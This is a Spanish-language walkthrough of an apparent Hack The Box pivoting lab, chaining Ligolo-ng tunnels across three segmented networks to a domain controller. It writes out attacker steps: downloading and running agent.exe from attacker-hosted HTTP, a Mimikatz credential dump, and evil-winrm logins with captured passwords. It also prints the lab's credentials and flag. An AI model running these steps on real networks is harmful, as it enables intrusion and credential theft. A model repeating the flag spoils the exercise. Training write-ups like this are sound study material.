
**Dominio:** INLANEFREIGHT.LOCAL
## Objetivo
Partiendo de un acceso inicial vía web shell en un host perimetral, atravesar una cadena de redes internas segmentadas (sin ruteo directo entre ellas) usando pivoting en múltiples saltos, hasta alcanzar el controlador de dominio y capturar la flag.

## Topología final

Atacante (HTB VPN)
│ Ligolo-ng (interfaz "ligolo")
▼
┌─────────────────────────────┐
│ inlanefreight (webadmin) │ 10.129.229.129 (ens160, HTB VPN)
│ │ 172.16.5.15 (ens192)
└─────────────┬─────────────────┘
│ SSH como mlefay (Plain Human work!)
▼
┌─────────────────────────────┐
│ PIVOT-SRV01 │ 172.16.5.35 (Ethernet0)
│ │ 172.16.6.35 (Ethernet1 2) → Ligolo "ligolo_level_2"
└─────────────┬─────────────────┘
│ WinRM como vfrank (Imply wet Unmasked!)
▼
┌─────────────────────────────┐
│ PIVOTWIN10 │ 172.16.6.25 (Ethernet0 2)
│ │ 172.16.10.25 (Ethernet1 2) → Ligolo "ligolo_level_3"
└─────────────┬─────────────────┘
│ WinRM como vfrank
▼
┌─────────────────────────────┐
│ ACADEMY-PIVOT-DC01 (DC) │ 172.16.10.5
│ 🏁 FLAG: 3nd-0xf-Th3-R@inbow! │ C:\Flag.txt.txt
└─────────────────────────────┘


Patrón recurrente del lab: **cada host comprometido resultó ser dual-homed**, exponiendo una subred interna adicional que solo era alcanzable a través de él — de ahí la necesidad de un pivote por salto (triple pivote en total).

## Cronología detallada

### 1. Acceso inicial — host "inlanefreight"
- Vector: web shell → reverse shell interactiva vía **Penelope**.
- Enumeración de red (`ip a`): host dual-homed.
  - `ens160`: `10.129.229.129/16` (red HTB VPN, por donde llega el atacante)
  - `ens192`: `172.16.5.15/16` (red interna)
- Enumeración de filesystem (home de `webadmin`): archivo de notas con pista de credenciales + llave privada SSH (`id_rsa`, passphrase desconocida, comentario `webadmin@inlanefreight.local`).
- **Credencial obtenida:** `mlefay` / `Plain Human work!`

### 2. Primer pivote — Ligolo-ng hacia 172.16.5.0/24
- Problema inicial: binario `agent` con glibc dinámica incompatible (`GLIBC_2.34`/`2.32` no encontrada en el host). Resuelto recompilando estático: `CGO_ENABLED=0 go build`.
- Agente conectado: `webadmin@inlanefreight.local` → proxy (`-connect ATACANTE:11601 -selfcert`).
- Sesión 1, interfaz `ligolo`, ruta `172.16.0.0/16 dev ligolo`.
- **Ping sweep** sobre `172.16.5.0/24` (nmap `-sn -PE` / loop de bash con pings en background) → hosts vivos localizados, incluyendo `172.16.5.35`.
- Acceso vía **SSH** a `172.16.5.35` (`PIVOT-SRV01`) con `mlefay` / `Plain Human work!`.

### 3. Escalación de credenciales en PIVOT-SRV01 — Mimikatz
Ejecutado `privilege::debug` + `sekurlsa::logonpasswords`. Hallazgos clave:
- Cuenta de máquina `PIVOT-SRV01$` — NTLM/SHA1 (uso limitado, password de máquina aleatoria).
- `mlefay` confirmada como cuenta **local** de `PIVOT-SRV01` (no de dominio).
- **`vfrank`** (dominio `INLANEFREIGHT`, logon tipo *Service*) — password en claro capturada vía Kerberos: **`Imply wet Unmasked!`**. `Logon Server: ACADEMY-PIVOT-D` — pista temprana del nombre del DC.

`ipconfig` en PIVOT-SRV01 confirmó **dual-homed**:
- `Ethernet0`: `172.16.5.35/16` (gateway `172.16.5.1`)
- `Ethernet1 2`: `172.16.6.35/16` (sin gateway) ← **red nueva**

### 4. Segundo pivote — doble pivote hacia 172.16.6.0/24
- En el proxy, sobre la sesión del agente 0: `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp` (relay para que el siguiente agente, sin ruta directa al atacante, pueda conectarse a través del primer agente).
- Servido `agent.exe` (compilado `GOOS=windows`) desde el atacante con `python3 -m http.server 8000`, y transferido a PIVOT-SRV01 vía la sesión SSH de `mlefay` con:
  ```powershell
  Invoke-WebRequest -Uri "http://172.16.5.15:8000/agent.exe" -OutFile agent.exe
  ```
  (se agregó `-OutFile` porque sin él, `Invoke-WebRequest` falla con `WebCmdletIEDomNotSupportedException` al intentar parsear la respuesta como DOM de Internet Explorer, que no está disponible en el sistema).
- Ejecutado en PIVOT-SRV01: `.\agent.exe -connect 172.16.5.15:11601 -ignore-cert` → sesión 2, interfaz `ligolo_level_2`.
- `autoroute` dejó las rutas en estado "Pending" (no aplicadas); corregido manualmente con `ip route add 172.16.6.0/24 dev ligolo_level_2` (prefijo `/24` en vez de `/16` para evitar conflicto con el prefijo idéntico ya usado por `ligolo`).
- Interrupción de sesión en medio del proceso (la conexión del agente 0 se recicló — nuevo puerto remoto efímero —, lo que tumbó la sesión relayada del agente 2). Se resolvió reconectando el agente en PIVOT-SRV01 y evitando reusar el puerto `11601` ya ocupado por el listener huérfano con uno distinto para el siguiente salto.
- **Ping sweep** sobre `172.16.6.0/24` → hosts vivos: `.25`, `.35` (PIVOT-SRV01 mismo), `.45`.
- `nmap -Pn -sT -sV` sobre `172.16.6.25`: Windows, puertos `135, 139, 445, 3389, 5985` abiertos.
- Acceso vía **WinRM** (`evil-winrm -i 172.16.6.25 -u vfrank -p 'Imply wet Unmasked!'`) exitoso. Hostname: **`PIVOTWIN10`**.

`ipconfig` en PIVOTWIN10 confirmó **dual-homed otra vez**:
- `Ethernet0 2`: `172.16.6.25/16` (gateway `172.16.6.1`)
- `Ethernet1 2`: `172.16.10.25/16` (sin gateway) ← **red nueva**

### 5. Tercer pivote — triple pivote hacia 172.16.10.0/24
- Listener en la sesión del agente 2 (PIVOT-SRV01): puerto `8000` para servir `agent.exe` vía HTTP y puerto `11601` para el relay de conexión del tercer agente.
- Transferido `agent.exe` a PIVOTWIN10 (vía la sesión WinRM de `vfrank`) con:
  ```powershell
  Invoke-WebRequest -Uri "http://172.16.6.35:8000/agent.exe" -OutFile agent.exe
  ```
- Ejecutado `agent.exe` en PIVOTWIN10 → sesión 3, agente `INLANEFREIGHT\vfrank@PIVOTWIN10`.
- `autoroute` en sesión 3: seleccionadas ambas rutas (`172.16.6.25/16` y `172.16.10.25/16`), interfaz creada: `ligolo_level_3`.
- Acceso vía **WinRM** a `172.16.10.5` con las mismas credenciales de `vfrank`. Hostname: **`ACADEMY-PIVOT-DC01`** — el controlador de dominio (coincide con la pista `Logon Server: ACADEMY-PIVOT-D` vista en el dump de Mimikatz).

### 6. Flag

C:\Flag.txt.txt
3nd-0xf-Th3-R@inbow!


## Estado final de listeners y túneles (post-reconexión)

**Listeners activos:**

| Agente | Listener (en el agente) | Redirige a (en el proxy) |
|---|---|---|
| PIVOT-SRV01\mlefay | `0.0.0.0:8000` | `127.0.0.1:8000` (servir `agent.exe` al tercer salto) |
| PIVOT-SRV01\mlefay | `0.0.0.0:11601` | `127.0.0.1:11601` (relay de conexión del agente 3) |
| webadmin@inlanefreight.local | `0.0.0.0:11601` | `127.0.0.1:11601` (relay de conexión del agente 2) |
| webadmin@inlanefreight.local | `0.0.0.0:8080` | `127.0.0.1:8080` (listener original, acceso web inicial) |
| webadmin@inlanefreight.local | `0.0.0.0:8000` | `127.0.0.1:8000` (servir `agent.exe` al segundo salto) |

**Túneles/sesiones activos:**

| # | Agente | Interfaz | Red que habilita |
|---|---|---|---|
| 1 | webadmin@inlanefreight.local | `ligolo` | 172.16.5.0/24 |
| 2 | PIVOT-SRV01\mlefay@PIVOT-SRV01 | `ligolo_level_2` | 172.16.6.0/24 |
| 3 | INLANEFREIGHT\vfrank@PIVOTWIN10 | `ligolo_level_3` | 172.16.10.0/24 |
## Credenciales recolectadas (resumen)
| Usuario | Password/Hash | Origen | Alcance |
|---|---|---|---|
| mlefay | `Plain Human work!` | Nota en home de webadmin | Local a PIVOT-SRV01 |
| webadmin | llave SSH (passphrase desconocida) | Home de webadmin | No usada (passphrase no resuelta) |
| vfrank | `Imply wet Unmasked!` | Mimikatz (`sekurlsa::logonpasswords`) en PIVOT-SRV01 | Dominio — válida en PIVOTWIN10 y en el DC |
## Lecciones técnicas clave
- **Segmentación por VLAN no se refleja en la máscara de subred**: varios hosts mostraban `/16` en interfaces que en realidad pertenecían a segmentos L2 aislados — la máscara es una decisión local del host, no una garantía de conectividad real.
- **Ligolo-ng requiere una interfaz tun (y ruta) por cada segmento nuevo**, y el comando `autoroute` puede dejar rutas en estado "Pending" o agregarlas con una máscara genérica que colisiona con una ruta ya existente — siempre conviene verificar con `ip route` y forzar el prefijo más específico (`/24`) cuando haya solapamiento.
- **Doble/triple pivote con Ligolo-ng** se logra encadenando `listener_add` (relay en el agente intermedio hacia el puerto real del proxy) — sin esto, un agente sin ruta directa al atacante no puede completar el handshake inicial.
- Mimikatz reveló credenciales de dominio en claro porque la sesión capturada era tipo `Service` con ticket Kerberos activo — un recordatorio de por qué limitar el uso de cuentas de servicio con cache de credenciales en texto plano.
